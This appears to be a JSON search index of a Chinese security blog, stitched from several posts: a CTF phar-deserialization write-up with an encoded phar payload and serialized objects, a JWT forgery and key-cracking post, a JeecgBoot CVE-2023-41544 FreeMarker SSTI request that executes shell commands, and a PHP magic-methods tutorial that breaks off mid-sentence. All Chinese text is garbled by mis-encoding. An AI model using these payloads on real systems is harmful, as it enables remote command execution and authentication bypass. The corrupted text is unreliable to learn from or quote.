10=%1F%8B%08%08%7C%22%1Df%00%03fixed_phar.phar%00s%F7t%B3%B0L%B4%B1/%C8%28P%88%8F%F7p%F4%09%89w%F6%F7%0D%F0%F4q%0D%D2%D0%B4V%B0%B7%E3%E5z%C8%C0%C0%C0%08%C4%82P%9A%81a5%10%FB%5B%99X%29%95%14%A5%A6%2AY%19YU%17%83xy%89%B9%A9J%D6%FEV%A6VJ%89%05%0590%19c%2B%A5%8A%8A%0A%90%04%90%95%98Y%A4de%08%126%B4R%2A%00%09%E20%C6%CF%1A%AC31%B9D%09%C82%042%83%0Br%DC2sR%FD%93%B2RA%82%B5%B5%60%D5i9%89%E9%20%15%16VJ%FAi%20N%3A%90%5B%8B%D0%EBg%CD%01tmIjq%89%5EIE%09%0B%C8%F9%8A%B2i%20%9A%A7%AE%FE%C66%88%87%C0%F2%CBO%CC%FE%BAh%E5%FC%1B%B2%AD%C9%1A%B7.8%19O%EC9%26%C9%04%94sw%F2u%02%00%15%9D%B7%24%27%01%00%00&amp;1=O:1:&quot;D&quot;:2:{s:5:&quot;start&quot;;s:1:&quot;w&quot;;} è¿è¡Œé¡¹ç›®å¹¶ä¸‹è½½æºç  pharåè®®è¯»æ–‡ä»¶æ“ä½œè§¦å‘pharååºåˆ—åŒ–æ‹¿flag 10=phar:///tmp/96c72754133e4a4d55d0baee6bfdb66a.jpg&amp;1=O:1:&quot;D&quot;:2:{s:5:&quot;start&quot;;s:1:&quot;r&quot;;} è¿è¡Œé¡¹ç›®å¹¶ä¸‹è½½æºç ","link":"/2025/12/11/Dest0g3%20520-web/"},{"title":"","text":"JWT æ”»å‡» JWTï¼Œå¸¸ç”¨ä¸‰ç§æ‰‹æ³•ï¼šæœªæ ¡éªŒç­¾åã€ç¦ç”¨å“ˆå¸Œã€æš´ç ´å¼±å¯†é’¥ã€‚ æœªæ ¡éªŒç­¾åï¼š æŸäº›æœåŠ¡ç«¯å¹¶æœªæ ¡éªŒ JWT ç­¾åï¼Œæ‰€ä»¥ï¼Œå°è¯•ä¿®æ”¹ token åç›´æ¥å‘ç»™æœåŠ¡ç«¯ï¼ŒæŸ¥çœ‹ç»“æœã€‚äºæ˜¯ï¼Œå°† user å­—æ®µå€¼ä» admin123 æ”¹ä¸º admin åï¼Œé‡æ–°ç”Ÿæˆæ–° tokenï¼šjwtåœ¨çº¿è§£å¯†/åŠ å¯† - JSONä¸­æ–‡ç½‘ ç›´æ¥æŠŠusernameæ”¹æˆadminå†å»ç¼–ç å‘ç°500é”™è¯¯ ç»§ç»­ä¸‹ä¸€ä¸ªæ”»å‡» ç¦ç”¨å“ˆå¸Œã€‚JWT ç¬¬ä¸€éƒ¨åˆ†å«æœ‰ alg å­—æ®µï¼Œè¯¥å­—æ®µæŒ‡å®šç”Ÿæˆç­¾åé‡‡ç”¨å“ªç§å“ˆå¸Œç®—æ³•ï¼Œè¯¥ç«™ä½¿ç”¨çš„æ˜¯ HS256ï¼Œå¯å°†è¯¥å­—æ®µç¯¡æ”¹ä¸ºnoneï¼ŒæŸäº› JWT çš„å®ç°ï¼Œä¸€æ—¦å‘ç° alg ä¸º noneï¼Œå°†ä¸å†ç”Ÿæˆå“ˆå¸Œç­¾åï¼Œè‡ªç„¶ä¸å­˜åœ¨æ ¡éªŒç­¾åä¸€è¯´ https://jwt.io/#debuggerå°† alg ä¸º none è§†ä¸ºæ¶æ„è¡Œä¸ºï¼Œæ‰€ä»¥ï¼Œæ— æ³•é€šè¿‡åœ¨çº¿å·¥å…·ç”Ÿæˆ JWTï¼š æ‰€ä»¥ç›´æ¥ä½¿ç”¨ pythonçš„ pyjwtåº“ ç”¨ none ç®—æ³•ç”Ÿæˆçš„ JWT åªæœ‰ä¸¤éƒ¨åˆ†äº†ï¼Œæ ¹æœ¬è¿ç­¾åéƒ½æ²¡ç”Ÿæˆã€‚å°†æ–°çš„ token å‘ç»™æœåŠ¡ç«¯ ä¾æ—§500é”™è¯¯ æš´ç ´å¼±å¯†é’¥ã€‚ åœ¨GitHubä¸Šé¢æ‰¾åˆ°ä¸€ä¸ªpyè„šæœ¬https://github.com/Ch1ngg/JWTPyCrack","link":"/2025/12/11/jwt/"},{"title":"","text":"JeecgBoot jmreport/loadTableData æ¥å£ SSTI æ¼æ´â€“CVE-2023-41544 1234567891011POST /jmreport/queryFieldBySql HTTP/1.1Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Content-Length: 95Accept: */*Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/json{&quot;sql&quot;:&quot;select '&lt;#assign ex=\\&quot;freemarker.template.utility.Execute\\&quot;?new()&gt; ${ ex(\\&quot;pwd\\&quot;) }' &quot;} æ¼æ´åŸç†12345678910111213141516171819//ä¼ å‚String userInputSql = request.getParam(&quot;sql&quot;); //åˆå§‹åŒ–FreeMarkeré…ç½®Configuration freeMarkerCfg = new Configuration(Configuration.VERSION_2_3_31);//é»˜è®¤é…ç½®æœªç¦ç”¨å±é™©ç±»è§£æ// freeMarkerCfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);//è¾“å…¥çš„sqlä½œä¸ºFreeMarkeræ¨¡æ¿å†…å®¹Template template = new Template( &quot;sqlTemplate&quot;, new StringReader(userInputSql), //ç”¨æˆ·è¾“å…¥çš„sqlç›´æ¥ä½œä¸ºæ¨¡æ¿å†…å®¹ freeMarkerCfg);//æ¸²æŸ“æ¨¡æ¿ï¼ˆè¾“å…¥çš„sqlä¸­çš„FreeMarkeræŒ‡ä»¤è¢«æ‰§è¡Œï¼‰String renderedContent = FreeMarkerTemplateUtils.processTemplateIntoString(template, null);executeSql(renderedContent); å®ä¾‹åŒ–Executeç±»ï¼Œå¾—åˆ°å¯æ‰§è¡Œå‘½ä»¤çš„exå¯¹è±¡ æ‰§è¡Œ${ex(&quot;ls&quot;)}ï¼šè°ƒç”¨exæ‰§è¡Œlså‘½ä»¤ï¼Œè·å–æœåŠ¡å™¨ä¸Šlsçš„æ‰§è¡Œç»“æœ","link":"/2025/12/13/JeecgBoot%20jmreportloadTableDataSSTI%20%E6%BC%8F%E6%B4%9E--CVE-2023-41544/"},{"title":"","text":"PHPé­”æœ¯æ–¹æ³• å‰è¨€PHPä¸­æŠŠä»¥ä¸¤ä¸ªä¸‹åˆ’çº¿__å¼€å¤´çš„æ–¹æ³•ç§°ä¸ºé­”æœ¯æ–¹æ³•(Magic methods)ï¼Œè¿™äº›æ–¹æ³•åœ¨PHPä¸­å……å½“äº†ä¸¾è¶³è½»é‡çš„ä½œç”¨ã€‚ é­”æœ¯æ–¹æ³•åŒ…æ‹¬ï¼š __construct()ï¼Œç±»çš„æ„é€ å‡½æ•° __destruct()ï¼Œç±»çš„ææ„å‡½æ•° __call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ __callStatic()ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ __get()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨ __set()ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨ __isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨ __unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚ __sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•° __wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•° __toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³• __invoke()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³• __set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ __clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨ __autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±» __debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯ èŒƒä¾‹ä¸‹é¢è®©æˆ‘ä»¬ä»¥å®ä¾‹çš„å½¢å¼å‘å¤§å®¶è®²è§£ä¸‹è¿™å‡ ä¸ªé­”æœ¯æ–¹æ³•æ—¶å¦‚ä½•ä½¿ç”¨çš„ã€‚ ä¸€ã€ __construct()ï¼Œç±»çš„æ„é€ å‡½æ•°phpä¸­æ„é€ æ–¹æ³•æ˜¯å¯¹è±¡åˆ›å»ºå®Œæˆåç¬¬ä¸€ä¸ªè¢«å¯¹è±¡è‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³•ã€‚åœ¨æ¯ä¸ªç±»ä¸­éƒ½æœ‰ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰æ˜¾ç¤ºåœ°å£°æ˜å®ƒï¼Œé‚£ä¹ˆç±»ä¸­éƒ½ä¼šé»˜è®¤å­˜åœ¨ä¸€ä¸ªæ²¡æœ‰å‚æ•°ä¸”å†…å®¹ä¸ºç©ºçš„æ„é€ æ–¹æ³•ã€‚ 1ã€ æ„é€ æ–¹æ³•çš„ä½œç”¨ é€šå¸¸æ„é€ æ–¹æ³•è¢«ç”¨æ¥æ‰§è¡Œä¸€äº›æœ‰ç”¨çš„åˆå§‹åŒ–ä»»åŠ¡ï¼Œå¦‚å¯¹æˆå‘˜å±æ€§åœ¨åˆ›å»ºå¯¹è±¡æ—¶èµ‹äºˆåˆå§‹å€¼ã€‚ 2ã€ æ„é€ æ–¹æ³•çš„åœ¨ç±»ä¸­çš„å£°æ˜æ ¼å¼ 1234function __constrct([å‚æ•°åˆ—è¡¨]){ æ–¹æ³•ä½“ //é€šå¸¸ç”¨æ¥å¯¹æˆå‘˜å±æ€§è¿›è¡Œåˆå§‹åŒ–èµ‹å€¼} 3ã€ åœ¨ç±»ä¸­å£°æ˜æ„é€ æ–¹æ³•éœ€è¦æ³¨æ„çš„äº‹é¡¹ 1231ã€åœ¨åŒä¸€ä¸ªç±»ä¸­åªèƒ½å£°æ˜ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼ŒåŸå› æ˜¯ï¼ŒPHPä¸æ”¯æŒæ„é€ å‡½æ•°é‡è½½ã€‚2ã€æ„é€ æ–¹æ³•åç§°æ˜¯ä»¥ä¸¤ä¸ªä¸‹ç”»çº¿å¼€å§‹çš„__construct() ä¸‹é¢æ˜¯å®ƒçš„ä¾‹å­ï¼š 1234567891011121314151617181920212223242526&lt;?php class Person { public $name; public $age; public $sex; /** * æ˜¾ç¤ºå£°æ˜ä¸€ä¸ªæ„é€ æ–¹æ³•ä¸”å¸¦å‚æ•° */ public function __construct($name=&quot;&quot;, $sex=&quot;ç”·&quot;, $age=27) { $this-&gt;name = $name; $this-&gt;sex = $sex; $this-&gt;age = $age; } /** * say æ–¹æ³• */ public function say() { echo &quot;æˆ‘å«ï¼š&quot; . $this-&gt;name . &quot;ï¼Œæ€§åˆ«ï¼š&quot; . $this-&gt;sex . &quot;ï¼Œå¹´é¾„ï¼š&quot; . $this-&gt;age; } } åˆ›å»ºå¯¹è±¡$Person1ä¸”ä¸å¸¦ä»»å‚æ•° 12$Person1 = new Person();echo $Person1-&gt;say(); //è¾“å‡º:æˆ‘å«ï¼šï¼Œæ€§åˆ«ï¼šç”·ï¼Œå¹´é¾„ï¼š27 åˆ›å»ºå¯¹è±¡$Person2ä¸”å¸¦å‚æ•°â€œå°æ˜â€ 12$Person2 = new Person(&quot;å°æ˜&quot;);echo $Person2-&gt;say(); //è¾“å‡ºï¼šæˆ‘å«ï¼šå¼ ä¸‰ï¼Œæ€§åˆ«ï¼šç”·ï¼Œå¹´é¾„ï¼š27 åˆ›å»ºå¯¹è±¡$Person3ä¸”å¸¦ä¸‰ä¸ªå‚æ•° 12$Person3 = new Person(&quot;æå››&quot;,&quot;ç”·&quot;,25);echo $Person3-&gt;say(); //è¾“å‡ºï¼šæˆ‘å«ï¼šæå››ï¼Œæ€§åˆ«ï¼šç”·ï¼Œå¹´é¾„ï¼š25 äºŒã€__destruct()ï¼Œç±»çš„ææ„å‡½æ•°é€šè¿‡ä¸Šé¢çš„è®²è§£ï¼Œç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“äº†ä»€ä¹ˆå«æ„é€ æ–¹æ³•ã€‚é‚£ä¹ˆä¸æ„é€ æ–¹æ³•å¯¹åº”çš„å°±æ˜¯ææ„æ–¹æ³•ã€‚ ææ„æ–¹æ³•å…è®¸åœ¨é”€æ¯ä¸€ä¸ªç±»ä¹‹å‰æ‰§è¡Œçš„ä¸€äº›æ“ä½œæˆ–å®Œæˆä¸€äº›åŠŸèƒ½ï¼Œæ¯”å¦‚è¯´å…³é—­æ–‡ä»¶ã€é‡Šæ”¾ç»“æœé›†ç­‰ã€‚ ææ„æ–¹æ³•æ˜¯PHP5æ‰å¼•è¿›çš„æ–°å†…å®¹ã€‚ æé€ æ–¹æ³•çš„å£°æ˜æ ¼å¼ä¸æ„é€ æ–¹æ³• __construct() æ¯”è¾ƒç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä»¥ä¸¤ä¸ªä¸‹åˆ’çº¿å¼€å§‹çš„æ–¹æ³• __destruct() ï¼Œè¿™ç§ææ„æ–¹æ³•åç§°ä¹Ÿæ˜¯å›ºå®šçš„ã€‚ 1ã€ ææ„æ–¹æ³•çš„å£°æ˜æ ¼å¼ 1234function __destruct(){ //æ–¹æ³•ä½“} æ³¨æ„ï¼šææ„å‡½æ•°ä¸èƒ½å¸¦æœ‰ä»»ä½•å‚æ•°ã€‚ 2ã€ ææ„æ–¹æ³•çš„ä½œç”¨ 1ä¸€èˆ¬æ¥è¯´ï¼Œææ„æ–¹æ³•åœ¨PHPä¸­å¹¶ä¸æ˜¯å¾ˆå¸¸ç”¨ï¼Œå®ƒå±ç±»ä¸­å¯é€‰æ‹©çš„ä¸€éƒ¨åˆ†ï¼Œé€šå¸¸ç”¨æ¥å®Œæˆä¸€äº›åœ¨å¯¹è±¡é”€æ¯å‰çš„æ¸…ç†ä»»åŠ¡ã€‚ ä¸¾ä¾‹æ¼”ç¤ºï¼Œå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233&lt;?phpclass Person{ public $name; public $age; public $sex; public function __construct($name=&quot;&quot;, $sex=&quot;ç”·&quot;, $age=22) { $this-&gt;name = $name; $this-&gt;sex = $sex; $this-&gt;age = $age; } /** * say è¯´è¯æ–¹æ³• */ public function say() { echo &quot;æˆ‘å«ï¼š&quot;.$this-&gt;name.&quot;ï¼Œæ€§åˆ«ï¼š&quot;.$this-&gt;sex.&quot;ï¼Œå¹´é¾„ï¼š&quot;.$this-&gt;age; } /** * å£°æ˜ä¸€ä¸ªææ„æ–¹æ³• */ public function __destruct() { echo &quot;æˆ‘è§‰å¾—æˆ‘è¿˜å¯ä»¥å†æŠ¢æ•‘ä¸€ä¸‹ï¼Œæˆ‘çš„åå­—å«&quot;.$this-&gt;name; }}$Person = new Person(&quot;å°æ˜&quot;);unset($Person); //é”€æ¯ä¸Šé¢åˆ›å»ºçš„å¯¹è±¡$Person ä¸Šé¢çš„ç¨‹åºè¿è¡Œæ—¶è¾“å‡ºï¼š 1æˆ‘è§‰å¾—æˆ‘è¿˜å¯ä»¥å†æŠ¢æ•‘ä¸€ä¸‹ï¼Œæˆ‘çš„åå­—å«å°æ˜ ä¸‰ã€ __call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ã€‚è¯¥æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•° $function_name ä¼šè‡ªåŠ¨æ¥æ”¶ä¸å­˜åœ¨çš„æ–¹æ³•åï¼Œç¬¬äºŒä¸ª $arguments åˆ™ä»¥æ•°ç»„çš„æ–¹å¼æ¥æ”¶ä¸å­˜åœ¨æ–¹æ³•çš„å¤šä¸ªå‚æ•°ã€‚ 1ã€ __call() æ–¹æ³•çš„æ ¼å¼ï¼š 1234function __call(string $function_name, array $arguments){ // æ–¹æ³•ä½“} 2ã€ __call() æ–¹æ³•çš„ä½œç”¨ï¼š 123ä¸ºäº†é¿å…å½“è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶äº§ç”Ÿé”™è¯¯ï¼Œè€Œæ„å¤–çš„å¯¼è‡´ç¨‹åºä¸­æ­¢ï¼Œå¯ä»¥ä½¿ç”¨ __call() æ–¹æ³•æ¥é¿å…ã€‚è¯¥æ–¹æ³•åœ¨è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œç¨‹åºä»ä¼šç»§ç»­æ‰§è¡Œä¸‹å»ã€‚ è¯·å‚è€ƒå¦‚ä¸‹ä»£ç ï¼š 1234567891011121314151617181920212223&lt;?phpclass Person{ function say() { echo &quot;Hello, world!&lt;br&gt;&quot;; } /** * å£°æ˜æ­¤æ–¹æ³•ç”¨æ¥å¤„ç†è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³• */ function __call($funName, $arguments) { echo &quot;ä½ æ‰€è°ƒç”¨çš„å‡½æ•°ï¼š&quot; . $funName . &quot;(å‚æ•°ï¼š&quot; ; // è¾“å‡ºè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•å print_r($arguments); // è¾“å‡ºè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶çš„å‚æ•°åˆ—è¡¨ echo &quot;)ä¸å­˜åœ¨ï¼&lt;br&gt;\\n&quot;; // ç»“æŸæ¢è¡Œ } }$Person = new Person(); $Person-&gt;run(&quot;teacher&quot;); // è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œåˆ™è‡ªåŠ¨è°ƒç”¨äº†å¯¹è±¡ä¸­çš„__call()æ–¹æ³•$Person-&gt;eat(&quot;å°æ˜&quot;, &quot;è‹¹æœ&quot;); $Person-&gt;say(); è¿è¡Œç»“æœï¼š 12345ä½ æ‰€è°ƒç”¨çš„å‡½æ•°ï¼šrun(å‚æ•°ï¼šArray ( [0] =&gt; teacher ) )ä¸å­˜åœ¨ï¼ä½ æ‰€è°ƒç”¨çš„å‡½æ•°ï¼šeat(å‚æ•°ï¼šArray ( [0] =&gt; å°æ˜ [1] =&gt; è‹¹æœ ) )ä¸å­˜åœ¨ï¼Hello, world! å››ã€ __callStatic()ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨æ­¤æ–¹æ³•ä¸ä¸Šé¢æ‰€è¯´çš„ __call() åŠŸèƒ½é™¤äº† __callStatic() æ˜¯æœªé™æ€æ–¹æ³•å‡†å¤‡çš„ä¹‹å¤–ï¼Œå…¶å®ƒéƒ½æ˜¯ä¸€æ ·çš„ã€‚ è¯·çœ‹ä¸‹é¢ä»£ç ï¼š 1234567891011121314151617181920212223&lt;?phpclass Person{ function say() { echo &quot;Hello, world!&lt;br&gt;&quot;; } /** * å£°æ˜æ­¤æ–¹æ³•ç”¨æ¥å¤„ç†è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³• */ public static function __callStatic($funName, $arguments) { echo &quot;ä½ æ‰€è°ƒç”¨çš„é™æ€æ–¹æ³•ï¼š&quot; . $funName . &quot;(å‚æ•°ï¼š&quot; ; // è¾“å‡ºè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•å print_r($arguments); // è¾“å‡ºè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶çš„å‚æ•°åˆ—è¡¨ echo &quot;)ä¸å­˜åœ¨ï¼&lt;br&gt;\\n&quot;; // ç»“æŸæ¢è¡Œ }}$Person = new Person();$Person::run(&quot;teacher&quot;); // è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œåˆ™è‡ªåŠ¨è°ƒç”¨äº†å¯¹è±¡ä¸­çš„__call()æ–¹æ³•$Person::eat(&quot;å°æ˜&quot;, &quot;è‹¹æœ&quot;);$Person-&gt;say(); è¿è¡Œç»“æœå¦‚ä¸‹ï¼š 123ä½ æ‰€è°ƒç”¨çš„é™æ€æ–¹æ³•ï¼šrun(å‚æ•°ï¼šArray ( [0] =&gt; teacher ) )ä¸å­˜åœ¨ï¼ä½ æ‰€è°ƒç”¨çš„é™æ€æ–¹æ³•ï¼šeat(å‚æ•°ï¼šArray ( [0] =&gt; å°æ˜ [1] =&gt; è‹¹æœ ) )ä¸å­˜åœ¨ï¼Hello, world! äº”ã€ __get()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨åœ¨ php é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ï¼Œç±»çš„æˆå‘˜å±æ€§è¢«è®¾å®šä¸º private åï¼Œå¦‚æœæˆ‘ä»¬è¯•å›¾åœ¨å¤–é¢è°ƒç”¨å®ƒåˆ™ä¼šå‡ºç°â€œä¸èƒ½è®¿é—®æŸä¸ªç§æœ‰å±æ€§â€çš„é”™è¯¯ã€‚é‚£ä¹ˆä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨é­”æœ¯æ–¹æ³• __get()ã€‚ é­”æœ¯æ–¹æ³•__get()çš„ä½œç”¨ 1åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œé€šè¿‡å®ƒå¯ä»¥åœ¨å¯¹è±¡çš„å¤–éƒ¨è·å–ç§æœ‰æˆå‘˜å±æ€§çš„å€¼ã€‚ æˆ‘ä»¬é€šè¿‡ä¸‹é¢çš„ __get() çš„å®ä¾‹æ¥æ›´è¿›ä¸€æ­¥çš„è¿æ¥å®ƒå§ï¼š 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass Person{ private $name; private $age; function __construct($name=&quot;&quot;, $age=1) { $this-&gt;name = $name; $this-&gt;age = $age; } /** * åœ¨ç±»ä¸­æ·»åŠ __get()æ–¹æ³•ï¼Œåœ¨ç›´æ¥è·å–å±æ€§å€¼æ—¶è‡ªåŠ¨è°ƒç”¨ä¸€æ¬¡ï¼Œä»¥å±æ€§åä½œä¸ºå‚æ•°ä¼ å…¥å¹¶å¤„ç† * @param $propertyName * * @return int */ public function __get($propertyName) { if ($propertyName == &quot;age&quot;) { if ($this-&gt;age &gt; 30) { return $this-&gt;age - 10; } else { return $this-&gt;$propertyName; } } else { return $this-&gt;$propertyName; } }}$Person = new Person(&quot;å°æ˜&quot;, 60); // é€šè¿‡Personç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œå¹¶é€šè¿‡æ„é€ æ–¹æ³•ä¸ºå±æ€§èµ‹åˆå€¼echo &quot;å§“åï¼š&quot; . $Person-&gt;name . &quot;&lt;br&gt;&quot;; // ç›´æ¥è®¿é—®ç§æœ‰å±æ€§nameï¼Œè‡ªåŠ¨è°ƒç”¨äº†__get()æ–¹æ³•å¯ä»¥é—´æ¥è·å–echo &quot;å¹´é¾„ï¼š&quot; . $Person-&gt;age . &quot;&lt;br&gt;&quot;; // è‡ªåŠ¨è°ƒç”¨äº†__get()æ–¹æ³•ï¼Œæ ¹æ®å¯¹è±¡æœ¬èº«çš„æƒ…å†µä¼šè¿”å›ä¸åŒçš„å€¼ è¿è¡Œç»“æœï¼š 12å§“åï¼šå°æ˜å¹´é¾„ï¼š50 å…­ã€ __set()ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨ __set() çš„ä½œç”¨ï¼š __set( value )` æ–¹æ³•ç”¨æ¥è®¾ç½®ç§æœ‰å±æ€§ï¼Œ ç»™ä¸€ä¸ªæœªå®šä¹‰çš„å±æ€§èµ‹å€¼æ—¶ï¼Œæ­¤æ–¹æ³•ä¼šè¢«è§¦å‘ï¼Œä¼ é€’çš„å‚æ•°æ˜¯è¢«è®¾ç½®çš„å±æ€§åå’Œå€¼ã€‚ è¯·çœ‹ä¸‹é¢çš„æ¼”ç¤ºä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass Person{ private $name; private $age; public function __construct($name=&quot;&quot;, $age=25) { $this-&gt;name = $name; $this-&gt;age = $age; } /** * å£°æ˜é­”æœ¯æ–¹æ³•éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼ŒçœŸæ¥ä¸ºç§æœ‰å±æ€§èµ‹å€¼æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œå¹¶å¯ä»¥å±è”½ä¸€äº›éæ³•èµ‹å€¼ * @param $property * @param $value */ public function __set($property, $value) { if ($property==&quot;age&quot;) { if ($value &gt; 150 || $value &lt; 0) { return; } } $this-&gt;$property = $value; } /** * åœ¨ç±»ä¸­å£°æ˜è¯´è¯çš„æ–¹æ³•ï¼Œå°†æ‰€æœ‰çš„ç§æœ‰å±æ€§è¯´å‡º */ public function say(){ echo &quot;æˆ‘å«&quot;.$this-&gt;name.&quot;ï¼Œä»Šå¹´&quot;.$this-&gt;age.&quot;å²äº†&quot;; }}$Person=new Person(&quot;å°æ˜&quot;, 25); //æ³¨æ„ï¼Œåˆå§‹å€¼å°†è¢«ä¸‹é¢æ‰€æ”¹å˜//è‡ªåŠ¨è°ƒç”¨äº†__set()å‡½æ•°ï¼Œå°†å±æ€§ånameä¼ ç»™ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå°†å±æ€§å€¼â€æå››â€ä¼ ç»™ç¬¬äºŒä¸ªå‚æ•°$Person-&gt;name = &quot;å°çº¢&quot;; //èµ‹å€¼æˆåŠŸã€‚å¦‚æœæ²¡æœ‰__set()ï¼Œåˆ™å‡ºé”™ã€‚//è‡ªåŠ¨è°ƒç”¨äº†__set()å‡½æ•°ï¼Œå°†å±æ€§åageä¼ ç»™ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå°†å±æ€§å€¼26ä¼ ç»™ç¬¬äºŒä¸ªå‚æ•°$Person-&gt;age = 16; //èµ‹å€¼æˆåŠŸ$Person-&gt;age = 160; //160æ˜¯ä¸€ä¸ªéæ³•å€¼ï¼Œèµ‹å€¼å¤±æ•ˆ$Person-&gt;say(); //è¾“å‡ºï¼šæˆ‘å«å°çº¢ï¼Œä»Šå¹´16å²äº† è¿è¡Œç»“æœï¼š 1æˆ‘å«å°çº¢ï¼Œä»Šå¹´16å²äº† ä¸ƒã€ __isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨åœ¨çœ‹è¿™ä¸ªæ–¹æ³•ä¹‹å‰æˆ‘ä»¬çœ‹ä¸€ä¸‹isset()å‡½æ•°çš„åº”ç”¨ï¼Œisset()æ˜¯æµ‹å®šå˜é‡æ˜¯å¦è®¾å®šç”¨çš„å‡½æ•°ï¼Œä¼ å…¥ä¸€ä¸ªå˜é‡ä½œä¸ºå‚æ•°ï¼Œå¦‚æœä¼ å…¥çš„å˜é‡å­˜åœ¨åˆ™ä¼ å›trueï¼Œå¦åˆ™ä¼ å›falseã€‚ é‚£ä¹ˆå¦‚æœåœ¨ä¸€ä¸ªå¯¹è±¡å¤–é¢ä½¿ç”¨isset()è¿™ä¸ªå‡½æ•°å»æµ‹å®šå¯¹è±¡é‡Œé¢çš„æˆå‘˜æ˜¯å¦è¢«è®¾å®šå¯ä¸å¯ä»¥ç”¨å®ƒå‘¢ï¼Ÿ åˆ†ä¸¤ç§æƒ…å†µï¼Œå¦‚æœå¯¹è±¡é‡Œé¢æˆå‘˜æ˜¯å…¬æœ‰çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥æµ‹å®šæˆå‘˜å±æ€§ï¼Œå¦‚æœæ˜¯ç§æœ‰çš„æˆå‘˜å±æ€§ï¼Œè¿™ä¸ªå‡½æ•°å°±ä¸èµ·ä½œç”¨äº†ï¼ŒåŸå› å°±æ˜¯å› ä¸ºç§æœ‰çš„è¢«å°è£…äº†ï¼Œåœ¨å¤–éƒ¨ä¸å¯è§ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±ä¸å¯ä»¥åœ¨å¯¹è±¡çš„å¤–éƒ¨ä½¿ç”¨isset()å‡½æ•°æ¥æµ‹å®šç§æœ‰æˆå‘˜å±æ€§æ˜¯å¦è¢«è®¾å®šäº†å‘¢ï¼Ÿå½“ç„¶æ˜¯å¯ä»¥çš„ï¼Œä½†ä¸æ˜¯ä¸€æˆä¸å˜ã€‚ä½ åªè¦åœ¨ç±»é‡Œé¢åŠ 